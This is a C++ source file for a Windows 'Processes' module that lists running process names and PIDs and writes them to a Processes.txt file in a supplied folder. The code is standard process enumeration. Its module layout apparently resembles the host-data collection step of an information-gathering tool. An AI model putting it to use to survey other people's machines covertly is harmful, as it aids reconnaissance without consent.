//
// Created by .1qxz on 08.06.2024.
//

#include "Processes.h"

void Processes::execute(fs::path &root) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
    {
        return;
    }

    cProcesses = cbNeeded / sizeof(DWORD);
    std::stringstream ss;

    for (i = 0; i < cProcesses; i++)
    {
        if(aProcesses[i] != 0)
        {
            std::string process = Processes::printProcess(aProcesses[i]);

            if(process.empty())
                continue;

            ss << process << "\n";
        }
    }

    Utils::writeFile(root / "Processes.txt", ss.str());
}

std::string Processes::printProcess(DWORD processID) {
    TCHAR szProcessName[MAX_PATH] = TEXT("");

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                                  PROCESS_VM_READ,
                                  FALSE, processID );

    if (NULL != hProcess )
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),&cbNeeded))
            GetModuleBaseName(hProcess, hMod, szProcessName,
                               sizeof(szProcessName)/sizeof(TCHAR));
    }
    else
        return "";

    CloseHandle(hProcess);

    std::stringstream ss;
    ss << szProcessName << "  (PID: " << processID << ")";

    return ss.str();
}
